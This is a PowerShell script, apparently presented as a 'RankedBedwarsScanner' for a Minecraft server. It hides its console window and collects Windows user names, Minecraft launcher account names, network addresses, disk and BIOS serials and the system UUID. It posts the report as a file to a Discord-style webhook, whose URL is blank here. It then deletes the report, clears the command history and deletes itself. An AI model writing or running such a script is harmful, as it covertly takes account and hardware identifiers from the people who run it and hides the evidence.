Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'
$hide = 0
$hwnd = [Console.Window]::GetConsoleWindow()
[Console.Window]::ShowWindow($hwnd, $hide)
$ErrorActionPreference = 'SilentlyContinue'
$username = $env:USERNAME
Start-Transcript -Path "C:\Users\$username\Desktop\$username.txt" -Append
try {
$users = Get-ChildItem "C:\Users" | Where-Object { $_.PSIsContainer } | Select-Object -ExpandProperty Name
foreach ($user in $users) {
    Write-Host "Windows Username: $user"
}
$languages = Get-WinUserLanguageList
if ($languages.Count -eq 0) {
    Write-Warning "No Windows language packs are installed on this computer."
} else {
    Write-Output "Installed Windows language packs:"
    $languages | ForEach-Object {
        Write-Output $_.LanguageTag
    }
}
$jsonFilePath = "$env:APPDATA/.minecraft/launcher_accounts.json"
$searchText = "name"
(Get-Content $jsonFilePath -ErrorAction SilentlyContinue) | Select-String -Pattern $searchText -ErrorAction SilentlyContinue
$jsonFilePath = "$env:APPDATA/.minecraft/launcher_accounts.json"
$searchText = "username"
(Get-Content $jsonFilePath -ErrorAction SilentlyContinue) | Select-String -Pattern $searchText -ErrorAction SilentlyContinue
$jsonFilePath = "$env:APPDATA/.minecraft/launcher_accounts_microsoft_store.json"
$searchText = "name"
(Get-Content $jsonFilePath -ErrorAction SilentlyContinue) | Select-String -Pattern $searchText -ErrorAction SilentlyContinue
$jsonFilePath = "$env:APPDATA/.minecraft/launcher_accounts_microsoft_store.json"
$searchText = "username"
(Get-Content $jsonFilePath -ErrorAction SilentlyContinue) | Select-String -Pattern $searchText -ErrorAction SilentlyContinue
$jsonFilePath = "$env:APPDATA/.minecraft/usercache.json"
$searchText = "name"
(Get-Content $jsonFilePath -ErrorAction SilentlyContinue) | Select-String -Pattern $searchText -ErrorAction SilentlyContinue
$jsonFilePath = "$env:APPDATA/.minecraft/usercache.json"
$searchText = "username"
(Get-Content $jsonFilePath -ErrorAction SilentlyContinue) | Select-String -Pattern $searchText -ErrorAction SilentlyContinue
$drivers = Get-WmiObject -Class Win32_PnPSignedDriver | Select-Object -Property DeviceName, Manufacturer, DriverVersion, DriverDate
if ($drivers) {
    Write-Output "Installed drivers information:"
    $drivers
} else {
    Write-Warning "No drivers information found."
}
$adapters = Get-NetAdapter
foreach ($adapter in $adapters) {
    Write-Host "Adapter Name: $($adapter.Name)"
    Write-Host "Adapter Interface Description: $($adapter.InterfaceDescription)"
    Write-Host "Adapter MAC Address: $($adapter.MacAddress)"
    Write-Host "Adapter Status: $($adapter.Status)"
    Write-Host "Adapter Speed: $($adapter.Speed) Gbps"
    Write-Host "Adapter IPv4 Address: $($adapter.IPv4Address.IPAddress)"
    Write-Host "Adapter IPv6 Address: $($adapter.IPv6Address.IPAddress)"
    Write-Host "Adapter Default Gateway: $($adapter.IPv4DefaultGateway.NextHop)"
    Write-Host "Adapter DNS Servers: $($adapter.DNSServer)"
    Write-Host "Adapter DHCP Enabled: $($adapter.DhcpEnabled)"
    Write-Host "Adapter DHCP Lease Expires: $($adapter.DhcpLeaseExpires)"
    Write-Host ""
}
$networkConfig = Get-NetIPConfiguration
foreach ($config in $networkConfig) {
    Write-Host "Configuration Name: $($config.InterfaceAlias)"
    Write-Host "DHCP Enabled: $($config.DhcpEnabled)"
    Write-Host "IPv4 Address: $($config.IPv4Address.IPAddress)"
    Write-Host "IPv6 Address: $($config.IPv6Address.IPAddress)"
    Write-Host "Default Gateway: $($config.IPv4DefaultGateway.NextHop)"
    Write-Host "DNS Servers: $($config.DNSServer)"
    Write-Host ""
}
$disks = Get-WmiObject Win32_DiskDrive | Select-Object Model, MediaType, InterfaceType, SerialNumber
foreach ($disk in $disks) {
    $diskID = $disk.Model + "-" + $disk.MediaType + "-" + $disk.InterfaceType + "-" + $disk.SerialNumber
    Write-Host $diskID
}
try {
    $disks = Get-WmiObject -Class Win32_LogicalDisk -ErrorAction Stop | Select-Object DeviceID, MediaType, VolumeName, Size
    foreach ($disk in $disks) {
        Write-Host "Device ID: $($disk.DeviceID)"
        Write-Host "Media Type: $($disk.MediaType)"
        Write-Host "Volume Name: $($disk.VolumeName)"
        Write-Host "Size: $($disk.Size) bytes"
    }
} catch {
}
$soundCards = Get-WmiObject Win32_SoundDevice
foreach ($soundCard in $soundCards) {
    Write-Host "Sound card name: $($soundCard.Name)"
}
$gpuInfo = Get-CimInstance -ClassName CIM_VideoController
foreach ($gpu in $gpuInfo) {
    Write-Host "GPU Name: $($gpu.Name)"
    Write-Host "GPU Adapter RAM: $($gpu.AdapterRAM) bytes"
    Write-Host "GPU Driver Version: $($gpu.DriverVersion)"
    Write-Host "GPU Video Processor: $($gpu.VideoProcessor)"
}
$ram = Get-CimInstance -ClassName Win32_PhysicalMemory
$total_ram = 0
foreach ($module in $ram) {
    $total_ram += $module.Capacity
}
$total_ram_gb = "{0:N2}" -f ($total_ram / 1GB)
Write-Host "Total RAM: $total_ram_gb GB"
Write-Host "RAM Modules:"
foreach ($module in $ram) {
    $capacity_gb = "{0:N2}" -f ($module.Capacity / 1GB)
    Write-Host " - Capacity: $capacity_gb GB, Speed: $($module.Speed) MHz, Manufacturer: $($module.Manufacturer)"
}
$CPU = (Get-WmiObject Win32_Processor).Name
$CPUCores = (Get-WmiObject Win32_Processor).NumberOfCores
$CPULogicalProcessors = (Get-WmiObject Win32_Processor).NumberOfLogicalProcessors
$PowerPlan = if (Get-CimInstance -Namespace root\cimv2\power -ClassName win32_powerplan -Filter "IsActive='True'") { (Get-CimInstance -Namespace root\cimv2\power -ClassName win32_powerplan -Filter "IsActive='True'").ElementName } else { "Unknown" }
$timezone = Get-WmiObject Win32_TimeZone | Select-Object -ExpandProperty Caption
$uuid = (Get-WmiObject Win32_ComputerSystemProduct).UUID
$BIOS = Get-WmiObject -Class Win32_BIOS | Select-Object SerialNumber, Manufacturer, SMBIOSBIOSVersion, ReleaseDate
$computer_name = $env:COMPUTERNAME
Write-Host "Computer Name: $computer_name"
Write-Host "CPU: $CPU"
Write-Host "CPU Cores: $CPUCores"
Write-Host "CPU Logical Processors: $CPULogicalProcessors"
Write-Host "BIOS: $($BIOS.Manufacturer) $($BIOS.SerialNumber), Version $($BIOS.SMBIOSBIOSVersion), Release date $($BIOS.ReleaseDate)"
Write-Host "Active Power Plan: $PowerPlan"
Write-Host "UUID: $uuid"
Write-Host "Timezone: $timezone"
} catch {
}
Stop-Transcript
$webhookUrl = ""
$username = $env:USERNAME
$filePath = "C:\Users\$username\Desktop\$username.txt"
$contentType = "multipart/form-data; boundary=MyBoundary"
$payload = @"
--MyBoundary
Content-Disposition: form-data; name="content"

**<RankedBedwarsScanner>** Computer Report detected
.
--MyBoundary
Content-Disposition: form-data; name="file"; filename="$($filePath)"

$(Get-Content -Path $filePath -Raw)
--MyBoundary--
"@
Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType $contentType
$filePath = "C:\Users\$username\Desktop\$username.txt"
if (Test-Path $filePath) {
    Remove-Item $filePath
    Write-Host "File deleted successfully"
} else {
    Write-Host "File not found"
}
Write-Output -InputObject 'This script will be self-destructed in 5 seconds.'
5..1 | ForEach-Object {
    If ($_ -gt 1) {
        "$_ seconds"
    } Else {
        "$_ second"
    }
    Start-Sleep -Seconds 1
}
Clear-History -ClearAll 
Remove-Item -Path $MyInvocation.MyCommand.Source
Start-Sleep -Seconds 2
$host.SetShouldExit(0)
